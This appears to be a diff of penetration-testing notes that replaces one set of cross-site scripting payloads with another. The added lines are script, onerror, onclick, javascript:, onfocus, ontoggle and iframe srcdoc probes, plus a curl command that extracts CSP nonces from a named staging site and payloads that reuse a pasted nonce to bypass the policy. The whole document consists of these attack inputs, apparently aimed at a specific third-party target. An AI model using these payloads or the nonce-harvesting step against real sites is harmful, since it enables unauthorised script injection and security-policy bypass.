@@ -1,5 +1,5 @@
-"document": "<h1>TOP-LEVEL-ALIVE</h1><iframe srcdoc=\"<h1>SRCDOC-ALIVE</h1><img src=x onerror=alert(document.domain)>\"></iframe>"
+"document": "<h1>M1</h1><script>alert('A-script')</script><img src=x onerror=alert('A-img')><p id=p1 onclick=alert('A-click')>M2</p><a href=javascript:alert('A-js')>M3</a><iframe srcdoc=\"<h1>M4</h1>\"></iframe><form>M5<input autofocus onfocus=alert('A-focus')></form><details open ontoggle=alert('A-toggle')><summary>M6</summary></details><svg><text>M7</text></svg><style>h1{color:red}</style>M8-END"
 
-"document": "<h1>TOP-LEVEL-ALIVE</h1><iframe srcdoc=\"&lt;h1&gt;SRCDOC-ALIVE&lt;/h1&gt;&lt;img src&#61;x onerror&#61;alert(document.domain)&gt;\"></iframe>"
+curl -s https://citibank-alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy | grep -oE 'nonce="[^"]*"'
 
-"document": "<iframe srcdoc=\"<script nonce='PASTE_NONCE'>alert(document.domain)</script>\"></iframe>"
+"document": "<script nonce='PASTED_NONCE'>alert(document.domain)</script><iframe srcdoc=\"<script nonce='PASTED_NONCE'>alert(document.domain)</script>\"></iframe>"
